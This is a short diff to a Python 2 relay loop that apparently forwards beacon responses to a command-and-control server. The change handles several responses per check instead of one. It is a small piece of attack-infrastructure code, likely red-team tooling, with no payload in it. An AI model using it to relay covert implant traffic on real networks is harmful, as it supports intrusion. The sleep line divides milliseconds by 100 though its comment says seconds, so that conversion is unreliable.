@@ -49,7 +49,6 @@ def createConnection(beaconId):
 		sys.exit(1)
 	return sock
 
-
 def taskLoop(sock, beaconId):
 	while True:
 		if config.verbose:
@@ -64,11 +63,13 @@ def taskLoop(sock, beaconId):
 		# Attempt to retrieve a response from the client
 		if config.verbose:
 			print commonUtils.color("Checking {} for a response...".format(beaconId))
-		b_response = establishedSession.checkForResponse(beaconId)
 
+		b_responses = establishedSession.checkForResponse(beaconId)
+		# b_response = establishedSession.checkForResponse(beaconId)
+		for b_response in b_responses:
 		# Let's relay this response to the c2 server
-		establishedSession.relayResponse(sock, b_response)
-		sleep(config.C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
+			establishedSession.relayResponse(sock, b_response)
+			sleep(config.C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
 
 
 def main():
